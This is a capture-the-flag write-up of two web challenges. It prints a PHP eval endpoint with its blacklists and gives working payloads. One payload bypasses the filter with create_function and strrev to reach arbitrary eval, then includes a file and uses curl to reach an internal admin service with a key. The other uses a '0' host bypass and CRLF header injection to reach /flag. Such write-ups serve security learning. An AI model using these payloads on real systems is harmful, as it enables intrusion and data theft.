### Lame Calc V2 (679 pts)

Given an attachment file server.zip with this directory tree
```
./server
├── docker
│   ├── admin
│   │   ├── Dockerfile
│   │   └── main.py
│   ├── nginx
│   │   └── Dockerfile
│   └── php
│       └── Dockerfile
├── docker-compose.yml
└── public
    └── index.php
```

And this is the source code for index.php

```
<?php
 
       if (isset($_POST["equation"])){
           $eq = $_POST["equation"];
 
           if (strlen($eq) > 265){
               die("Too long !");
           }
 
           if(preg_match("/\~|\||\[|\]|\`|\'|\||\^|}|{|;|@|&|#|!|\>|\?|\</i",$eq)){
               die("Bad Char !");
           }
 
           $blacklist = "include|read|all|open|file|dir|opt|glob|object|iter|eval|return|field|close|set";
 
           if (preg_match("/$blacklist/i", $eq)){
               die("Bad Word !");
           }
           eval("echo " . $eq . " ;");
       }
       ?>
```
It is the same with before instead, this challenge is more restricted than before

From that source code, we know that our restriction is
1. Length our input must be under 265
2. We cant use `"~|[]``'^}{;@&#!>?<"`
3. Our input cannot contains with this words `"include|read|all|open|file|dir|opt|glob|object|iter|eval|return|field|close|set"`

After that our input will be evaluated by application.

Our next restriction is `disable_functions`. filesystem functions, shell functions, and phpinfo, and extract are restricted too.

#### Solving the Problem
1. Length and Regex Restriction.
Because the limit for length is increased to 265, We were able to bypass length and regex restriction using a callback function, we will use `create_function`
```
POST / HTTP/1.1
Host: 103.152.242.222:20000
… < snip - snip > …

equation=create_function("",strrev("lave")."(".strrev("TSOP_$")."\x5b\"x\"\x5d)\x3b")()&x=include(‘/secret_for_admin.txt’)
```
2. Accessing the different service docker.
```
POST / HTTP/1.1
Host: 103.152.242.222:20000
… < snip - snip > …

equation=create_function("",strrev("lave")."(".strrev("TSOP_$")."\x5b\"x\"\x5d)\x3b")()&x=$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://admin:5000/admin_gan");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'X-Admin: t45dasqasfirkiww'));
curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "action%3d1%26value%3d/");        
        var_dump(curl_exec($ch));
var_dump(curl_error($ch));
        curl_close($ch);
```


### Sicilian Dragon (698 pts)
We didn't get any information regarding this challenge.

After doing some information gathering, we could make this conclusion :
1. `/flag` only available for local
2. There's restriction input for `localhost`

#### Solving the Problem

1. We were able to bypass the `localhost` restriction using `0` for accessing the local network.
2. Since we need to send header `admin`, so we could assume it must be CRLF Injection.
3. This will be our final payload.
```
POST /fetch HTTP/1.1
Host: 103.152.242.222:20001
… < snip - snip > …

is_https=0&host=0&port=20001&path=%2Fflag&method=GET /flag HTTP/1.1
admin: 2f01e10c-206b-4de5-8fa0-f7d929b263da
TEST: 123
```